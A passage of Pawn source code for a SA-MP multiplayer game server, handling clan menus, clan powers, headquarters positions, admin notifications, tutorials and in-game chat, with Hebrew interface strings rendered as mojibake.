			_head = "рЇўшщэ", _style = DIALOG_STYLE_LIST, _b1 = "сщЎхЄ", _b2 = "чцх°", _parent = clan_hqcontrol;
			sadd(_text,@c(grey) "ёщсхс сюўхэ - рщшщ");
			sadd(_text,@c(grey) "ёщсхс сюўхэ - юфщ°");
			sadd(_text,@c(grey) "фщЇхъ срхщ°");
			sadd(_text,@c(grey) "·цхцф юфщ°ф ьюЄьф хьюшф");
		}
		case clan_settingspeed:
		{
			_head = "ўсщЄ· юфщ°хщх·", _style = DIALOG_STYLE_LIST, _b1 = "∙щЁхщ", _b2 = "чцх°", _parent = clan_hqcontrol;
			for(new i = 0, c = 0; i < claninfo[playerinfo[playerid][clan]][cobjects]; i++) if(objectinfo[claninfo[playerinfo[playerid][clan]][cobject][i]][omoving][0])
			{
				format(string,sizeof(string),"{%s}рхсщщўш цц #%d: юфщ°х· %d",HexStringOfColor(!(i % 2) ? white : lightyellow),++c,floatround(objectinfo[claninfo[playerinfo[playerid][clan]][cobject][i]][omoveto][3]));
				sadd(_text,string);
			}
		}
		case clan_setspeed:
		{
			format(_head,sizeof(_head),"∙щЁхщ юфщ°х· ьрхсщщўш цц #%d",paramint);
			_style = DIALOG_STYLE_INPUT, _b1 = "∙щЁхщ", _b2 = "чцх°", _parent = clan_settingspeed;
			sadd(_text,@c(grey) ":Ёр ьфўьщу ыря р· фюфщ°х· фчу∙ф ∙ь фрхсщщўш, ю-1 Єу 10");
		}
		case clan_usematerial:
		{
			_head = "ю°ўэ рхсщщўшщэ", _style = DIALOG_STYLE_LIST, _b1 = "сщЎхЄ", _b2 = "чцх°", _parent = clan_hqcontrol;
			for(new i = 0; i < sizeof(ObjectMaterials); i++)
			{
				format(string,sizeof(string),"{%s}%s",HexStringOfColor(!(i % 2) ? white : lightyellow),ObjectMaterials[i][omName]);
				sadd(_text,string);
			}
		}
		case clan_chatcolor, clan_chatlcolor: _head = id == clan_chatcolor ? ("∙щЁхщ ЎсЄ фы·щсф") : ("∙щЁхщ ЎсЄ фы·щсф ььщу°щэ"), _style = DIALOG_STYLE_INPUT, _b1 = "∙щЁхщ", _b2 = "чцх°", _parent = clan_chat, colorChoosing = true;
		case clan_buypower, clan_usepower:
		{
			new s = playerinfo[playerid][clickon];
			format(_head,sizeof(_head),cupowers[s][CUPName]);
			_style = DIALOG_STYLE_MSGBOX, _b1 = id == clan_buypower ? ("ўЁщщф") : ("GO!"), _b2 = "чцх°", _parent = clan_powers;
			sadd(_text,@c(lightred) ":∙э фыхч");
			format(string,sizeof(string),@c(white) "%s",cupowers[s][CUPName]);
			sadd(_text,string);
			sadd(_text,@c(lightred) ":ючщ°");
			format(string,sizeof(string),@c(white) "$%d",cupowers[s][CUPCost]);
			sadd(_text,string);
			if(id == clan_usepower)
			{
				sadd(_text,@c(lightred) ":рЁ°тщф Ёу°∙· юыь ю∙··є сыхч");
				format(string,sizeof(string),@c(white) "%d",cupowers[s][CUPEnergy]);
				sadd(_text,string);
				sadd(_text,@c(lightred) ":цюя фю·Ёф Ёу°∙ ьсщЎхЄ фыхч");
				format(string,sizeof(string),@c(white) "∙Ёщх· %d",cupowers[s][CUPCD]);
				sadd(_text,string);
			}
			sadd(_text,@c(lightred) ":ющуЄ");
			switch(s)
			{
				case 0: // Team Healing
				{
					sadd(_text,@c(white) ".ющьхщ чщщэ юфщ° ьыь чс°щ фўьря фю∙··Їщэ ссщЎхЄ фыхч");
				}
				case 1: // Fire Area
				{
					sadd(_text,@c(white) ".юёсщс ью∙··Їщ фыхч ЁхЎ° ю°хсЄ юр∙ ∙щтя Єьщфэ юыЁщёф ∙ь Їхь∙щэ ьрх·х фю°хсЄ");
					sadd(_text,".фрцх° Ё∙р° ўщщэ ью∙ъ юЄш цюя");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, фрцх° щфщф тухь щх·°");
				}
				case 2: // Full Ammo
				{
					sadd(_text,@c(white) ":Team Healing ∙у°хт °ЎщЁщ ∙ь");
					sadd(_text,".ющьхщ чщщэ, ютя х·чюх∙· ьыь чс°щ фўьря фю∙··Їщэ ссщЎхЄ фыхч");
				}
				case 3: // HQ Explosion
				{
					sadd(_text,@c(white) ".фыхч щхЎ° ЇщЎхї срцх°щэ фю°ыцщщэ ∙ь фюЇўуф, сётЁхя ф∙юуф ЄЎющ·");
					sadd(_text,"!∙щюх ьс ыщ фЇщЎхї ·хўє тэ р· чс°щ фўьря");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, ыъ щххЎ°х щх·° ЇщЎхЎщэ");
				}
				case 4: // Water Shield
				{
					sadd(_text,@c(white) ".юёсщс ьюЇўу· фўьря ЁхЎ° ыух° ющэ ЄЁў фютя Єьщф");
					sadd(_text,".рэ щ∙··Їх сщЎщ°· фыхч °ў 3 ю∙··Їщэ, фыух° щ∙р° ьфтя Єь фюЇўуф ью∙ъ уўф");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, ыъ фыух° щЄьэ рч°щ щх·° цюя. ыь ю∙··є Ёхёє фхр Єху 20 ∙Ёщх·");
				}
				case 5: // Earth Energy
				{
					sadd(_text,@c(white) ".фыхч щЎющч ЄЎщэ юфруюф хщюьр р· чщщфэ ∙ь ыь ющ ∙ЁюЎр срцх° фЎющчф ючс°щ фўьря");
					sadd(_text,".фыхч ююьр тэ ютя. фЄЎщэ щЄьюх ьрч° уўф");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, ыъ фЄЎщэ щЄьюх рч°щ щх·° цюя. ыь ю∙··є Ёхёє фхр Єху 20 ∙Ёщх·");
				}
				case 6: // X2 Damage
				{
					sadd(_text,@c(white) ".ыхч цф щчцў Їщ 2 р· фыхч ∙ь фщ°щх· ∙ь ∙чўЁщ фўьря срцх° фюЇўуф");
					sadd(_text,".фф∙ЇЄф ·Їхт ьрч° 30 ∙Ёщх·");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, ыь фф∙ЇЄф ·Їхт рч°щ щх·° цюя. ыь ю∙··є Ёхёє фхр Єху 10 ∙Ёщх·");
				}
				case 7: // Cages
				{
					sadd(_text,@c(white) ".ыьхсщэ, ыюёЇ° фю∙··Їщэ сыхч щЁхЄх сюфщ°х· ьыщххя фЇхь∙щэ фхьыщ ф°ть");
					sadd(_text,".фэ щЁёх ьыьхр рх·э ью∙ъ уўф ыъ ∙·хыьх ьф·ыхЁя Ётуэ");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, ыъ щххЎ°х щх·° ыьхсщэ");
				}
				case 8: // Meteors
				{
					sadd(_text,@c(white) ".юшрх°щэ чцўщэ сющхчу щЇьх Єь фюЇўуф хщ∙ющух рх·ф, рсь щчу рщ·ф тэ р· фЇхь∙щэ");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, ыъ щфщх щх·° юшрх°щэ");
				}
				case 9: // Coloured Circle
				{
					sadd(_text,@c(white) ".юЄть ыух°щ ЎсЄ щххЎ° ёсщс ю∙··Їщ фыхч хщ∙хт° сюфщ°х· ыущ ьЇхЎї Їхь∙щэ ьюЇўуф");
					sadd(_text,".фыух°щэ фэ ыюёЇ° фЇхь∙щэ сьщ ў∙° ьюёЇ° ю∙··Їщ фыхч");
				}
				case 10: // Infinite Health
				{
					sadd(_text,@c(white) ".Єэ ыхч цф чс°щ фўьря фю∙··Їщэ сыхч щўсьх чщщэ рщЁёхЇщщэ хщхыьх ьф°хт срюЎЄх·э р· ыь фЇхь∙щэ");
					sadd(_text,".ф∙ЇЄ· фчщщэ фрщЁёхЇщщэ чьф ью∙ъ уўф, рьр рэ щхЎрщэ юрцх° фюЇўуф хрц фщр юё·щщю· ющщущ·");
					sadd(_text,@c(green) ".шщЇ: ыыь ∙щ∙ щх·° ю∙··Їщэ ссщЎхЄ фыхч, ыъ фф∙ЇЄф ·Їхт рч°щ щх·° цюя. ыь ю∙··є Ёхёє фхр Єху 15 ∙Ёщх·");
				}
				case 11: // Clan God
				{
					sadd(_text,@c(orange) "!юЇьЎ· ЄЁўщ· ∙Ёў°р· \"рьхфщ фўьря\" ·°у юф∙ющщэ х··ўхє сыхч ыь Їхь∙ ∙срцх° фюЇўуф");
				}
			}
			if(id == clan_buypower)
			{
				sadd(_text,@c(grey) "\n\n.ьчї Єь \"ўЁщщф\" Єь юЁ· ьўЁх· р· фыхч фцф");
				sadd(_text,".юф°тЄ ∙фхр ЁўЁф, чс°щ фўьря щыхьщэ ьф∙·ю∙ сх срхЇя ўсхЄ сьщ ьўЁх· рх·х ∙хс");
				sadd(_text,@c(red) "\n\n.∙щэ ьс! ўЁф р· фыхч °ў рэ р·ф срю· сшхч сцф. тэ рэ ·Ї°х∙ юфўьря рх ·°Ўф ьючхў р· фыхч хьўсь фчц°, ьр Ёщ·я ьЄ∙х· р· цф");
				sadd(_text,".фыхч щ∙р° ∙щщъ ьўьря срхЇя ·ющущ Єу ∙фўьря щючў хьр щфщф Ёщ·я ьфхЎщр р· фыхч ююЁх");
			}
			else
			{
				sadd(_text,@c(grey) "\n\n,рэ рёЇ· 3 ьЇчх· ючс°щ фўьря хфэ ЁюЎрщэ ьщуъ, хщ∙ ьфэ юёЇщў рЁ°тщф");
				sadd(_text,".ыущ ьф∙·ю∙ сыхч \"GO!\" ьчї Єь");
			}
		}
		case clan_cameraselect:
		{
			format(_head,sizeof(_head),"юЎью· рсшчф #%d",paramint+1);
			_style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_cameras;
			sadd(_text,@c(grey) "ЎЇщщф");
			sadd(_text,@c(grey) "фццф");
			sadd(_text,@c(red) "ючщўф");
			if(ccameras[playerinfo[playerid][clan]][paramint][camLevel] == 1) sadd(_text,@c(yellow) "HD-∙у°хт ь");
		}
		case clan_cameraremove:
		{
			_head = "ючщў· юЎьюф", _style = DIALOG_STYLE_MSGBOX, _b1 = "ючў", _b2 = "чцх°", _parent = clan_cameraselect;
			format(string,sizeof(string),"?фрэ р·ф сшхч ∙с°ЎхЁъ ьючхў р· юЎьюф юёЇ° #%d",paramint+1);
			sadd(_text,string);
			sadd(_text,".ьр щхчц° ёыхэ ыёЇщ хьр щфщф Ёщ·я ьфчцщ° р· фюЎьюф фцх");
		}
		case clan_cameraupgrade:
		{
			_head = "∙у°хт юЎьюф", _style = DIALOG_STYLE_MSGBOX, _b1 = "∙у°т", _b2 = "чцх°", _parent = clan_cameraselect;
			format(string,sizeof(string),"?HD фрэ р·ф сшхч ∙с°ЎхЁъ ь∙у°т р· юЎьюф юёЇ° #%d ь°ю·",paramint+1);
			sadd(_text,string);
			sadd(_text,".ьр щхчц° ёыхэ ыёЇщ хьр щфщф Ёщ·я ьфчцщ° р· фюЎьюф фцх");
		}
	    case clan_cw:
	    {
			_head = "юьчюх· ўьрЁщэ", _style = DIALOG_STYLE_LIST, _b1 = "фю∙ъ", _b2 = "чцх°", _parent = clan_main;
			sadd(_text, @c(grey)"фцюЁф ьюьчю· ўьрЁщэ");
			sadd(_text, @c(grey)"рщ∙х° юьчю· ўьрЁщэ");
			sadd(_text, @c(grey)"ёщ°хс ьюьчю· ўьрЁщэ");
			sadd(_text, @c(grey),"Ї°щ∙ф ююьчю· ўьрЁщэ");
		}
		case clan_cwinvite:
		{
		    _head = "фцюя ьюьчюф", _style = DIALOG_STYLE_INPUT, _b1 = "фцюя", _b2 = "чцх°", _parent = clan_cw;
		    sadd(_text, @c(grey), "рЁр фця р· ∙э фўьря ∙рх·х ·°Ўф ьфцющя ьюьчюф");
		    if(param[0]) sadd(_text, param);
		}
		case clan_bankhistory:
		{
			_head = "фщёшх°щщ· сЁў фўьря", _style = DIALOG_STYLE_MSGBOX, _b1 = "ётх°", _b2 = "чцх°", _parent = clan_edit;
			_text = @c(green);
			for(new i = 1; i <= MAX_CBANK_LOGS; i++)
			{
				format(string,sizeof(string),"BankLog%d",i);
				format(string,sizeof(string),"%s\n",fgetstring(f,string));
				sadd(_text,string);
			}
		}
		default: return 1;
	}
	if(colorChoosing)
	{
		if(strlen(param) > 0)
		{
			format(string,sizeof(string),@c(red) "%s\n",param);
			sadd(_text,string);
		}
		sadd(_text,@c(grey) ".Ёр ьфўьщу р· " @c(lightred) "∙э фЎсЄ" @c(white) " рх юёЇ°щ фЎсЄ рчу рч°щ ф∙Ёщ");
		sadd(_text,@c(grey) "> /colors :ь°∙щю· ∙юх· ЎсЄщэ рЇ∙°щщэ");
	}
	playerinfo[playerid][cclick][1] = _parent; // parent
	playerinfo[playerid][cclick][0] = id; // current
	playerinfo[playerid][cclickparamint] = paramint;
	strmid(playerinfo[playerid][cclickparam],param,0,32);
	format(_head,sizeof(_head),"{%s}[%s] %s °юф %d сўьря",ClanHexColor(playerinfo[playerid][clan]),_head,claninfo[playerinfo[playerid][clan]][cname],playerinfo[playerid][lclan]);
	ShowPlayerDialog(playerid,dialog_clan,_style,_head,_text,_b1,_b2);
	#undef sadd
	return 1;
}
//=[CloseClanMenu]==============================================================
stock CloseClanMenu(clanid,reason[],bool:retry,except=INVALID_PLAYER_ID)
{
	new string[256];
	format(string,sizeof(string),@c(red) ",ЁрьЎЁх ьётх° ·Ї°щш фўьря ∙фхЇщЄ юхьъ ьрч°хЁф юрч° хыЁ°рф щ∙ ∙щЁхщ с·хыя ф·Ї°щш\n:рх ∙рщЁъ юёхть ь°рх· р· ф·Ї°щш щх·°. ёщсф\n\n" @c(lightred) "%s",reason);
	if(retry) format(string,sizeof(string),"%s" @c(red) "\n\n:\"рэ с°ЎхЁъ ьчцх° ьЎЇх· с·Ї°щш ьчї Єь фыЇ·х° \"Ёёф ∙хс",string);
	for(new i = 0; i < claninfo[clanid][cmembers]; i++) if(playerinfo[claninfo[clanid][cplayers][i]][indialog] == dialog_clan && claninfo[clanid][cplayers][i] != except) ShowPlayerDialog(claninfo[clanid][cplayers][i],retry ? dialog_clanclose : dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ётщ°· ·Ї°щш фўьря",string,retry ? ("ф·чь ючу∙") : ("ётх°"),retry ? ("ётх°") : (""));
}
//=[ClanNotification]===========================================================
stock ClanNotification(clanid,not[]) for(new i = 0, clancol = rgba2hex(claninfo[clanid][ccolor][0],claninfo[clanid][ccolor][1],claninfo[clanid][ccolor][2],255); i < claninfo[clanid][cmembers]; i++) SendClientMessage(claninfo[clanid][cplayers][i],clancol,not);
//=[DoneSelectingPos]===========================================================
stock DoneSelectingPos(playerid,Float:x,Float:y,Float:z)
{
	assert playerinfo[playerid][clan] > 0 && claninfo[playerinfo[playerid][clan]][cvalid] && playerinfo[playerid][selectingpos][0] > -1;
	new changedhow[64], changedhow2[64], changedwhat[64], string[M_S], Float:a, Float:p[3];
	format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
	GetPlayerFacingAngle(playerid,a);
	switch(playerinfo[playerid][selectingpos][1])
	{
		case 1:
		{
			if(!HasClanPermission(playerid,clanperm_edit,playerinfo[playerid][selectingpos][2])) return 1;
			if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя юЇўуф, ьр Ёщ·я ьўсхЄ ∙щтх°",playerinfo[playerid][selectingpos][2]);
			GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2]);
			if(!IsPlayerInRangeOfPoint(playerid,250.0,p[0],p[1],p[2])) return ClanDialog(playerid,clan_err,".фющўхэ фцф °чхў юущ ююЇўу· фўьря ∙ьъ",playerinfo[playerid][selectingpos][2]);
			changedwhat = "ф∙щтх° ьюЇўуф";
			claninfo[playerinfo[playerid][clan]][chq][0] = x;
			claninfo[playerinfo[playerid][clan]][chq][1] = y;
			claninfo[playerinfo[playerid][clan]][chq][2] = z;
			claninfo[playerinfo[playerid][clan]][chq][3] = a;
			fsetfloat(string,"X",claninfo[playerinfo[playerid][clan]][chq][0]);
			fsetfloat(string,"Y",claninfo[playerinfo[playerid][clan]][chq][1]);
			fsetfloat(string,"Z",claninfo[playerinfo[playerid][clan]][chq][2]);
			fsetfloat(string,"Rot",claninfo[playerinfo[playerid][clan]][chq][3]);
		}
		case 2:
		{
			if(!HasClanPermission(playerid,clanperm_edit,playerinfo[playerid][selectingpos][2])) return 1;
			if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя юЇўуф, ьр Ёщ·я ьўсхЄ ∙щтх°",playerinfo[playerid][selectingpos][2]);
			GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2]);
			if(!IsPlayerInRangeOfPoint(playerid,250.0,p[0],p[1],p[2])) return ClanDialog(playerid,clan_err,".фющўхэ фцф °чхў юущ ююЇўу· фўьря ∙ьъ",playerinfo[playerid][selectingpos][2]);
			changedwhat = "ф∙щтх° ьюЇўуф с°ыс";
			claninfo[playerinfo[playerid][clan]][chqv][0] = x;
			claninfo[playerinfo[playerid][clan]][chqv][1] = y;
			claninfo[playerinfo[playerid][clan]][chqv][2] = z;
			claninfo[playerinfo[playerid][clan]][chqv][3] = a;
			fsetfloat(string,"VX",claninfo[playerinfo[playerid][clan]][chq][0]);
			fsetfloat(string,"VY",claninfo[playerinfo[playerid][clan]][chq][1]);
			fsetfloat(string,"VZ",claninfo[playerinfo[playerid][clan]][chq][2]);
			fsetfloat(string,"VR",claninfo[playerinfo[playerid][clan]][chq][3]);
		}
		case 3:
		{
		    ClanDialog(playerid, clan_main);
			if(!HasClanPermission(playerid,clanperm_bank,playerinfo[playerid][selectingpos][2])) return 1;
			//if(claninfo[playerinfo[playerid][clan]][ccp] == -1) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя сЁў ўьря",playerinfo[playerid][selectingpos][2]);
			GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2]);
			if(!IsPlayerInRangeOfPoint(playerid,250.0,p[0],p[1],p[2])) return ClanDialog(playerid,clan_err,".фющўхэ фцф °чхў юущ ююЇўу· фўьря ∙ьъ",playerinfo[playerid][selectingpos][2]);
			changedwhat = "сЁў фўьря";
			//new clcp = claninfo[playerinfo[playerid][clan]][ccp];
			//cpinfo[clcp][cpx] = x, cpinfo[clcp][cpy] = y, cpinfo[clcp][cpz] = z;
			//UpdateCheckpointArea(clcp);
			fsetfloat(string,"CPX",x);
			fsetfloat(string,"CPY",y);
			fsetfloat(string,"CPZ",z);
		}
	}
	switch(playerinfo[playerid][selectingpos][0])
	{
		case 0, 1: changedhow = "∙сх р·ф Єхюу", changedhow2 = "∙сх фхр Єхюу";
		case 2: changedhow = "∙сч°· у°ъ фюЇф", changedhow2 = "∙сч° у°ъ фюЇф";
	}
	format(string,sizeof(string),@c(green) " .∙щЁщ· сфЎьчф р· фющўхэ ∙ь " @c(lightgreen) "%s" @c(green) " ьющўхэ " @c(lightgreen) "%s",changedhow,changedwhat);
	ClanDialog(playerid,clan_not,string,playerinfo[playerid][selectingpos][2]);
	format(string,sizeof(string)," * ∙щЁф р· ющўхэ %s ьющўхэ %s %s",changedwhat,changedhow2, GetName(playerid));
	ClanNotification(playerinfo[playerid][clan],string);
	playerinfo[playerid][selectingpos][0] = -1, playerinfo[playerid][selectingpos][1] = 0;
	PlaySound(playerid,1057);
	return 1;
}
//=[AdminNotification]==========================================================
stock AdminNotification(header[],text[],press[],seconds,type,param=-1)
{
	new string[128], c = 0;
	format(string,sizeof(string),"~y~%s~n~~w~~h~%s",header,text);
	if(strlen(press) > 0) format(string,sizeof(string),"%s%s~n~press ~r~~k~~CONVERSATION_NO~ ~w~~h~to ~r~%s",string,strfind(text,"~n~") == -1 ? ("") : ("~n~"),press);
	if(adminot != INVALID_TEXT_DRAW)
	{
		TextDrawDestroy(adminot);
		adminot = INVALID_TEXT_DRAW;
	}
	adminot = TextDrawCreate(33.000000,292.000000,string);
	TextDrawBackgroundColor(adminot,255);
	TextDrawFont(adminot,2);
	TextDrawLetterSize(adminot,0.260000,1.100000);
	TextDrawColor(adminot,-1);
	TextDrawSetOutline(adminot,1);
	TextDrawSetProportional(adminot,1);
	TextDrawUseBox(adminot,1);
	TextDrawBoxColor(adminot,38450);
	TextDrawTextSize(adminot,180.000000,20.000000);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i))
	{
		TextDrawShowForPlayer(i,adminot);
		c++;
		playerinfo[i][iadminot][0] = seconds, playerinfo[i][iadminot][1] = type, playerinfo[i][iadminot][2] = param;
		PlaySound(i,1056);
	}
	return c;
}
//=[Tutorial_SetLine]===========================================================
stock Tutorial_SetLine(tutid,partid,line,text[])
{
	new str[32];
	format(str,sizeof(str),"tutorial%02d%02d%02d",tutid,partid,line);
	SetProperty_STR(str,text);
}
//=[Tutorial_GetLine]===========================================================
stock Tutorial_GetLine(tutid,partid,line)
{
	new str[128];
	format(str,sizeof(str),"tutorial%02d%02d%02d",tutid,partid,line);
	format(str,sizeof(str),GetProperty_STR(str));
	return str;
}
//=[Tutorial_SetText]===========================================================
stock Tutorial_SetText(tutid,key[],text[])
{
	new str[32];
	format(str,sizeof(str),"tutorial%02d%s",tutid,key);
	SetProperty_STR(str,text);
}
//=[Tutorial_GetText]===========================================================
stock Tutorial_GetText(tutid,key[])
{
	new str[128];
	format(str,sizeof(str),"tutorial%02d%s",tutid,key);
	print(str);
	print(GetProperty_STR(str));
	format(str,sizeof(str),GetProperty_STR(str));
	return str;
}
//=[WantedGame]=================================================================
stock WantedGame(playerid,gamename[],cmd[])
{
	if(gameWantingIdle > 0) return ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".ыс° сщў∙х ЇЄщьх· с-5 фуўх· фрч°хЁх·, Ёёф ∙хс юрхч° щх·°","·Ї°щш","щЎщрф");
	format(wantedGame,sizeof(wantedGame),gamename);
	if(strlen(cmd)) format(wantedGameCMD,sizeof(wantedGameCMD),strfind(cmd,"start") == -1 ? ("%s start") : ("%s"),cmd);
	else wantedGameCMD[0] = 0;
	gameWantingIdle = 300;
	new string[M_S], c = 0;
	format(string,sizeof(string),"Х %s%s юсў∙ ьф·чщь р· фЇЄщьх· %s фю∙·ю∙",(strlen(cmd) < 2) ? ("!") : ("/Start - Їўху· ўщЎх° !"), wantedGame,GetName(playerid));
 	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && !playerinfo[i][modeafk]) c++, SendClientMessage(i,purple,string);
	return !c ? ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".рщя рующЁщэ ЇЄщьщэ ы°тЄ с∙°·, ыъ ∙рє рчу ьр щыхь ьр∙° р· фсў∙ф ∙ьъ","·Ї°щш","щЎщрф") : ShowPlayerDialog(playerid,dialog_gameserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "!фсў∙ф Ё∙ьчф",@c(green) ".Ё∙ьчф сў∙ф ьрующЁщэ ьф·чщь р· фЇЄщьх· ∙сщў∙·","·Ї°щш","щЎщрф");
}
//=[ToggleClanTeamKill]=========================================================
stock ToggleClanTeamKill(clanid,bywho=INVALID_PLAYER_ID)
{
	assert claninfo[clanid][csystems][clansys_tk];
	claninfo[clanid][csystemparam][clansys_tk] = !claninfo[clanid][csystemparam][clansys_tk];
	for(new i = 0; i < claninfo[clanid][cmembers]; i++) TeamDefines(claninfo[clanid][cplayers][i]);
	new string[M_S], f[64];
	if(bywho != INVALID_PLAYER_ID)
	{
		format(string,sizeof(string)," * [/teamkill] %s р· юЄ°ы· фрЁшщ шщэ ўщь %s",claninfo[clanid][csystemparam][clansys_tk] ? ("фЇЄщь") : ("ыщсф"),GetName(bywho));
		ClanNotification(clanid,string);
	}
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	format(string,sizeof(string),"System%dParam",ClanSystems[clansys_tk][clsUniqueID]);
	fsetint(f,string,claninfo[clanid][csystemparam][clansys_tk]);
	return 1;
}
//=[ObjectiveComplete]==========================================================
stock ObjectiveComplete(playerid,objid,bool=true)
{
	if(playerinfo[playerid][objective][objid]) return 1;
	playerinfo[playerid][objective][objid] = true;
	new string[M_S];
	format(string,sizeof(string),"Objective%d",Objectives[objid][obUniqueID]);
	fsetint(fuser(playerid),string,1);
	format(string,sizeof(string),@c(green) "...ф∙ью· р· фю∙щюф \"%s\"! °рф ёшршё ыущ ьуЄ· рщцф ю∙щюх· фх∙ьюх Єу Єы∙щх",Objectives[objid][obName]);
	if(bool) ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "!ю∙щюф фх∙ьюф",string,"OK","");
	SendClientMessage(playerid,green,string);
	return 1;
}
//=[CreateFountain]=============================================================
stock CreateFountain(modelid,Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz)
{
	fountain[fountains] = CreateSObject(modelid,x,y,z,rx,ry,rz);
	CreateAreaForObject(fountain[fountains],8.0,4.0,oarea_fountain);
	Create3DTextLabel("ь∙щЁхщ ЎсЄ ~k~~CONVERSATION_NO~ ьчї",lightblue,x,y,z-0.8,6.0,world_normal,1);
	fountains++;
	return fountain[fountains];
}
//=[SetFountainsTo]=============================================================
stock SetFountainsTo(mid) for(new i = 0; i < fountains; i++) SetDynamicObjectMaterial(fountain[i],0,ObjectMaterials[mid][omModelID],ObjectMaterials[mid][omTXD],ObjectMaterials[mid][omTexture]);
//=[CheckForInvaders]===========================================================
stock CheckForInvaders(clanid)
{
	assert claninfo[clanid][cvalid];
	new player[MAX_PLAYERS], players = 0, string[M_S], bool:clans[MAX_CLANS] = {false,...}, clansMax[2] = {0,...}, vtypes[6] = {false,...}, vtc = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] != clanid && GetPlayerHQ(i) == clanid && !claninfo[clanid][cpeace][playerinfo[i][clan]]) player[players++] = i;
	if(players > 0)
	{
		if(players == 1) format(string,sizeof(string),"цхфф Їхь∙ рчу");
		else format(string,sizeof(string),"цхфх %d Їхь∙щэ",players);
		for(new j = 0, i = INVALID_PLAYER_ID, vt = -1; j < players; j++)
		{
			i = player[j];
			if(playerinfo[i][clan] > 0 && !clans[playerinfo[i][clan]])
			{
				clans[playerinfo[i][clan]] = true;
				if(playerinfo[i][clan] > clansMax[0]) clansMax[0] = playerinfo[i][clan];
				clansMax[1]++;
			}
			if(IsPlayerInAnyVehicle(i))
			{
				vt = GetVehicleType(GetPlayerVehicleID(i));
				if(!vtypes[vt]) vtypes[vt] = true, vtc++;
			}
		}
		if(vtc > 0)
		{
			for(new i = 0, c = 0; i < sizeof(vtypes); i++) if(vtypes[i])
			{
				c++;
				if(c == 1) format(string,sizeof(string),"%s ю∙·ю∙щэ с",string);
				else if(c == vtc) format(string,sizeof(string),"%s х",string);
				else format(string,sizeof(string),"%s, ",string);
				switch(i)
				{
					case 0: format(string,sizeof(string),"%sюыхЁщ·",string);
					case 1: format(string,sizeof(string),"%sрхЇЁхЄ",string);
					case 2: format(string,sizeof(string),"%sёщ°ф",string);
					case 3: format(string,sizeof(string),"%sфьщўхЇш°",string);
					case 4: format(string,sizeof(string),"%sюшхё",string);
					default: format(string,sizeof(string),"%s°ыс ьр щухЄ",string);
				}
			}
		}
		else format(string,sizeof(string),"%s %s",string,players == 1 ? ("ычщщь °тьщ") : ("ычщщьщэ °тьщщэ"));
		if(clansMax[1] > 0)
		{
			format(string,sizeof(string),"%s %s",string,clansMax[1] == 1 ? ("юфўьря") : ("юфўьрЁщэ"));
			for(new i = 0, c = 0; i < clansMax[0]; i++) if(clans[i])
			{
				format(string,sizeof(string),!c ? ("%s %s") : ("%s, %s"),claninfo[clans[i]][cname],string);
				c++;
			}
		}
	}
	format(string,sizeof(string)," [%s Security] %s",claninfo[clanid][cname],string);
	ClanNotification(clanid,string);
	return 1;
}
//=[cl]=========================================================================
stock cl(i)
{
	new string[16];
	format(string,sizeof(string),"CL%d",i);
	return string;
}
//=[Chat_Join]==================================================================
stock Chat_Join(playerid,chatid)
{
	playerinfo[playerid][inchat] = chatid, playerinfo[playerid][chatinvite] = INVALID_PLAYER_ID;
	for(new i = 1; i <= MAX_CHAT_LINES; i++) SetPVarString(playerid,cl(i),"");
	return 1;
}
//=[Chat_Quit]==================================================================
stock Chat_Quit(playerid,bool:justquit=true,bool:msg=false)
{
	new left = 0, tmp = playerinfo[playerid][inchat], firstfound = INVALID_PLAYER_ID;
	playerinfo[playerid][inchat] = INVALID_PLAYER_ID, playerinfo[playerid][chatinvite] = INVALID_PLAYER_ID, playerinfo[playerid][minchat] = false;
	for(new i = 1; i <= MAX_CHAT_LINES; i++) DeletePVar(playerid,cl(i));
	if(justquit)
	{
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inchat] == tmp && i != playerid)
		{
			left++;
			if(firstfound == INVALID_PLAYER_ID) firstfound = i;
		}
		if(msg)
		{
			new string[M_S];
			format(string,sizeof(string),"щщЎр юфЎ'рш %s",GetName(playerid));
			Chat_Write(tmp,string,firstfound == INVALID_PLAYER_ID);
			if(firstfound != INVALID_PLAYER_ID)
			{
				format(string,sizeof(string),"%s :юЁфь фЎ'рш фчу∙ ∙Ёсч° фхр",GetName(firstfound));
